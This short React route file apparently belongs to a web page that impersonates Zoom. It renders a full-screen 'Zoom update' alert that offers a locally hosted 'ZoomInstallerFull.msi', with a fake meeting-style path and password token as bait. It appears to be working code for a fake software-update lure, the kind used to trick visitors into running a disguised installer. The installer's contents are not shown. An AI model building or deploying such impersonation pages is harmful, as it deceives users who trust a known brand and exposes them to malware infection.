import ZoomUpdateFullScreen from "@/app/components/ZoomAlert";
const UPDATE_FILE_PATH = "/prod/ZoomInstallerFull.msi";
// /prod/7.1.5.43453/x64/
const AUTHORIZED_PATH =
  "/k/8237770634?pwd=i7gt2XsqvGas7hF6ZaJyQaKCnjVdfU.1";

export default function ZoomMeetingRoute() {
  return <ZoomUpdateFullScreen UPDATE_FILE_PATH={UPDATE_FILE_PATH} AUTHORIZED_PATH={AUTHORIZED_PATH} />;
}
